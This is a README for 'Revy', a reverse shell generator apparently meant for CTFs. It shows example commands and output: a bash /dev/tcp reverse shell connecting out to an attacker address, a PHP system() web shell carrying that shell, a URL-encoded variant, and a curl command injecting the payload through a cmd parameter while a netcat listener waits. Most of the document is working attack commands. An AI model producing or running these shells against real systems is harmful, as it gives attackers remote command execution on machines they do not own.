# Revy
### Fast Reverse Shell Generator
This is some fast and dirty code for fun and CTFs.<BR>
  
┌──(kali㉿kali)-[~]\
└─$ `curl http://127.0.0.1:50000?cmd=$(revy eth0:1234 nc -s)`<BR><BR>
  
┌──(kali㉿kali)-[~]\
└─$ `rlwrap nc -lvnp 1234`<BR>
listening on [any] 1234 ...<BR>
`connect to [192.168.199.130] from (UNKNOWN) [192.168.199.130] 39682`<BR><BR>
# 
### Many Thanks to:<BR>
[RevShells](https://www.revshells.com/)<BR>
[0KAMi93](https://github.com/0KAMi93)
  <BR>
# 
## Usage
### Necessary Arguments

```
Interface:ListeningPort
Reverse Shell
```
  
### Optional Arguments

```

-w      WebShell                ('-w list' For webshell list)
-n      Nohup
-b      Base64 Encode
-e      Escape Char             (Comma Separated Values)
-u      UrlEncode
-fu     Full URL Encode         ( Thanks to 0KAMi93 )
-s      Space to Cross

```
    
## Examples:
┌──(kali㉿kali)-[~]\
└─$ `revy 10.10.10.10:1234 bash`   

`bash -i >& /dev/tcp/10.10.10.10/1234 0>&1`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]\
└─$ `revy eth0:1234 bash -w phpsystem`

`<?php system('bash -i >& /dev/tcp/192.168.199.135/1234 0>&1');?>`
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]\
└─$ `revy eth0:1234 bash -w phpsystem -s`

`<?php+system('bash+-i+>&+/dev/tcp/192.168.199.135/1234+0>&1');?>`
    <BR><BR>
## Add an Alias:
`alias revy="/usr/bin/python3 /opt/Revy/revy.py";echo 'alias revy="/usr/bin/python3 /opt/Revy/revy.py"' >> ~/.zshrc`

Remember to change '/opt/Revy/revy.py' to the actual location of the script. 
